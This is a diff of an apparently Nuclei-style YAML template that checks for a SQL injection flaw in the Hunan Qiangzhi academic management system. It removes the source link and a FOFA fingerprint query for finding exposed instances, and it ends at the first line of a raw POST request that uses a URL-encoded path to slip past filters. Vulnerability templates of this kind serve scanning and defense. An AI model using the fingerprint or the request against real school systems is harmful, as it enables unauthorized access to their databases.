@@ -3,12 +3,8 @@ info:
   name: 湖南强智教务管理系统sjxx存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ce9i6veuqk0surrk'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ce9i6veuqk0surrk
-    fofa: body="湖南强智科技发展有限公司" || body="verifycode.servlet" || body="/findmm.jsp"
 http:
 - raw:
   - 'POST /jiaowu/stkxt/sjxx/sjxx_sp_list.js%70 HTTP/1.1
